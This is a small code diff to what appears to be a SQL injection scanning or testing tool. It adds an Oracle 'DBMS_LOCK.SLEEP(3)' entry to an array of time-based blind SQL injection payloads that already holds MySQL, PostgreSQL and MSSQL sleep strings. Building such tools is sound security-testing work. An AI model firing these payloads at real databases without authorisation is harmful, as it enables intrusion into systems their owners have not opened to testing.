@@ -601,6 +601,7 @@ export const timePayloads = [
   { p: "' OR SLEEP(3)--", label: "mysql_sleep" },
   { p: "'; SELECT pg_sleep(3)--", label: "postgresql_sleep" },
   { p: "1; WAITFOR DELAY '00:00:03'--", label: "mssql_waitfor_numeric" },
+  { p: "DBMS_LOCK.SLEEP(3)", label: "oracle_sleep" },
 ];
 
 // Injection execution
